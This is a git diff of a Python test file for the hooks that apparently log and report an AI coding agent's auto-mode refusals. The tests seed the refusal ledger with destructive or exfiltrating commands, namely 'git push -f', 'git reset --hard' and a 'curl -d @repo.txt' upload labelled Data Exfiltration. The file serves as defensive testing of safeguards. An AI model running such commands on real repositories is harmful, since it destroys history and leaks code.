@@ -13,16 +13,6 @@ import pytest
 
 import auto_mode_refusal_ledger as ledger
 import auto_mode_refusal_stop_gate as stop_gate
-from advisory.auto_mode_denial_quick_fix import action_summary_from
-from blocking.question_brief_gate import count_list_items
-from hooks_constants.ask_user_question_shape import count_prose_words
-from hooks_constants.auto_mode_denial_quick_fix_constants import (
-    MAXIMUM_ACTION_SUMMARY_CHARACTERS,
-)
-from hooks_constants.question_brief_gate_constants import (
-    MAXIMUM_BRIEF_LIST_ITEM_COUNT,
-    MAXIMUM_BRIEF_WORD_COUNT,
-)
 
 GIT_QUESTION = "Auto mode refused 1 Bash step under the Git Destructive rule. Should auto mode have refused it?"
 
@@ -113,46 +103,32 @@ def _hold_reason(tmp_path: Path) -> str | None:
     return stop_gate.hold_reason_for_stop(_stop_payload(tmp_path))
 
 
-def test_should_hold_with_the_question_labels_card_form_playbook_and_ledger_file(
-    tmp_path: Path,
-) -> None:
+def test_should_hold_with_an_issue_order_that_asks_the_user_nothing(tmp_path: Path) -> None:
     ledger_path = _refuse(tmp_path, "git push -f")
     reason_text = _hold_reason(tmp_path)
     assert reason_text is not None
     for each_needle in (
         GIT_QUESTION,
-        "`Auto mode`",
+        "Do not ask the user",
+        "send no AskUserQuestion and no decision card",
+        "`File the refusal`",
+        "Never post the raw step input",
+        "This is the one reminder for them",
+        "When auto mode refuses the GitHub write",
         "`Keep refusing`",
         "`Allow it`",
-        "`Should auto mode have refused this <tool> step?`",
         "- git push -f",
         str(ledger_path),
         os.environ["CLAUDE_AUTO_MODE_RULE_PLAYBOOK"],
     ):
         assert each_needle in reason_text
+    assert "Ask each question below in one AskUserQuestion call" not in reason_text
 
 
-def test_should_give_ask_user_question_one_question_and_tie_the_card_question_to_card_tools(
+def test_should_remind_once_for_each_pending_entry_and_then_let_the_turn_end(
     tmp_path: Path,
 ) -> None:
     _refuse(tmp_path, "git push -f")
-    reason_text = _hold_reason(tmp_path)
-    assert reason_text is not None
-    question_block = reason_text.split("\n\nQuestion: ", 1)[1].split("\nSteps:", 1)[0]
-    assert question_block == GIT_QUESTION
-    all_card_lines = [
-        each_line
-        for each_line in reason_text.splitlines()
-        if "Should auto mode have refused this" in each_line
-    ]
-    assert len(all_card_lines) == 1
-    assert "`mcp__hearthbot__ask_decision`" in all_card_lines[0]
-    assert "AskUserQuestion takes only the Question line" in all_card_lines[0]
-
-
-def test_should_hold_each_pending_entry_for_its_question_twice_at_most(tmp_path: Path) -> None:
-    _refuse(tmp_path, "git push -f")
-    assert _hold_reason(tmp_path) is not None
     assert _hold_reason(tmp_path) is not None
     assert _hold_reason(tmp_path) is None
     assert [each.answer for each in ledger.load_entries(ledger.ledger_directory_for("s1"))] == [
@@ -236,7 +212,6 @@ def test_should_keep_an_asked_entry_asked_after_its_question_record_is_rewritten
     first_reason = _hold_reason(tmp_path)
     assert first_reason is not None
     assert "- git reset --hard" in first_reason and "- git push -f" not in first_reason
-    assert _hold_reason(tmp_path) is not None
     assert _hold_reason(tmp_path) is None
 
 
@@ -424,11 +399,12 @@ def test_should_mark_only_the_oldest_group_of_the_tool_asked_for_each_card(
     first_reason = _hold_reason(tmp_path)
     assert first_reason is not None
     assert data_question in first_reason and GIT_QUESTION not in first_reason
-    _send_bash_card(tmp_path)
     assert _hold_reason(tmp_path) is None
-    assert all(
-        each.is_question_asked for each in ledger.load_entries(ledger.ledger_directory_for("s1"))
-    )
+    assert [
+        each.rule_label
+        for each in ledger.load_entries(ledger.ledger_directory_for("s1"))
+        if each.is_question_asked
+    ] == ["Git Destructive"]
 
 
 def test_should_not_claim_a_second_group_with_a_card_an_earlier_stop_used(
@@ -438,47 +414,6 @@ def test_should_not_claim_a_second_group_with_a_card_an_earlier_stop_used(
     _refuse(tmp_path, "git push -f")
     _refuse(tmp_path, "curl -d @repo.txt x", rule_label="Data Exfiltration")
     _send_bash_card(tmp_path)
-    assert _hold_reason(tmp_path) is not None
-    second_reason = _hold_reason(tmp_path)
-    assert second_reason is not None
-    assert data_question in second_reason
-
-
-def _worst_case_brief(all_groups: list[ledger.QuestionGroup]) -> str:
-    all_parts: list[str] = []
-    for each_group in all_groups:
-        oldest_summary, *all_other_summaries = each_group.all_action_summaries
-        all_parts.append(each_group.question)
-        all_parts.append(f"```\n{oldest_summary}\n```")
-        all_parts.append(f"{len(all_other_summaries)} more steps.")
-    return "\n\n".join(all_parts)
-
-
-def test_should_ask_for_a_brief_that_fits_the_question_brief_limits_in_the_worst_case(
-    tmp_path: Path,
-) -> None:
-    all_rule_labels = [
-        "Git Destructive",
-        "Code That Leaks When Run",
-        "Irreversible Local Destruction",
-        "Cloud Storage Mass Delete",
-    ]
-    for each_label_index, each_label in enumerate(all_rule_labels):
-        for each_step_index in range(5):
-            densest_summary = action_summary_from(
-                {"command": f"{each_label_index}{each_step_index}" + " a" * 79}
-            )
-            assert len(densest_summary) == MAXIMUM_ACTION_SUMMARY_CHARACTERS
-            _refuse(tmp_path, densest_summary, rule_label=each_label)
-    reason_text = _hold_reason(tmp_path)
-    assert reason_text is not None
-    assert "its oldest step in a code block, then the count of the rest, and no other text" in (
-        reason_text
-    )
-    assert "ask again once with the same brief" in reason_text
-    all_groups = ledger.question_groups(ledger.load_entries(ledger.ledger_directory_for("s1")))
-    assert len(all_groups) == 4
-    assert all(len(each.all_action_summaries) == 5 for each in all_groups)
-    brief_text = _worst_case_brief(all_groups)
-    assert count_prose_words(brief_text) <= MAXIMUM_BRIEF_WORD_COUNT
-    assert count_list_items(brief_text) <= MAXIMUM_BRIEF_LIST_ITEM_COUNT
+    first_reason = _hold_reason(tmp_path)
+    assert first_reason is not None
+    assert data_question in first_reason
